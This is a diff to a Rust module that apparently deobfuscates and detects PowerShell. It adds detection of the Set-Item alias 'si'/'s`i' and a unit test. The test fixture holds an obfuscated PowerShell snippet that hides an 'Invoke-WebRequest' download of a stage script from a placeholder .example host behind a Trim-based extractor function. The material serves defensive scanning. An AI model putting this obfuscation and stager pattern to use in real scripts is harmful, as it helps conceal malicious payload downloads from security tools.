@@ -948,7 +948,7 @@ static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[allow(clippy::expect_used)]
 static PS_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?is)\b(?:New-Item|n`?i|Set-Item)\b([^{}]{0,512})\{"#)
+    Regex::new(r#"(?is)\b(?:New-Item|n`?i|Set-Item|s`?i)\b([^{}]{0,512})\{"#)
         .expect("ps item function def regex")
 });
 
@@ -3468,6 +3468,7 @@ fn has_literal_extractor_def_signal(lower: &str) -> bool {
         || lower.contains("new-item")
         || lower.contains("set-item")
         || has_new_item_alias_signal(lower)
+        || has_set_item_alias_signal(lower)
 }
 
 fn has_new_item_alias_signal(lower: &str) -> bool {
@@ -3475,6 +3476,16 @@ fn has_new_item_alias_signal(lower: &str) -> bool {
         || lower.starts_with("n`i ")
         || [
             " ni ", "(ni ", ";ni ", "\nni ", " n`i ", "(n`i ", ";n`i ", "\nn`i ",
+        ]
+        .iter()
+        .any(|needle| lower.contains(needle))
+}
+
+fn has_set_item_alias_signal(lower: &str) -> bool {
+    lower.starts_with("si ")
+        || lower.starts_with("s`i ")
+        || [
+            " si ", "(si ", ";si ", "\nsi ", " s`i ", "(s`i ", ";s`i ", "\ns`i ",
         ]
         .iter()
         .any(|needle| lower.contains(needle))
@@ -5044,7 +5055,8 @@ impl PsObfuscationSignals {
             || lower.contains("-n ")
             || lower.contains("new-item")
             || lower.contains("set-item")
-            || has_new_item_alias_signal(&lower);
+            || has_new_item_alias_signal(&lower)
+            || has_set_item_alias_signal(&lower);
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
         let trim_extractor = has_function_def && lower.contains(".trim");
@@ -7354,6 +7366,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.exa
                 "'Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1'"
             ),
             "Set-Item function path-name trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_set_item_alias_function_path_name_trim_extractor_call_is_rewritten() {
+        let text = r#"(s`i Function:\Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1'"
+            ),
+            "Set-Item alias function path-name trim extractor call was not rewritten:\n{out}"
         );
     }
 
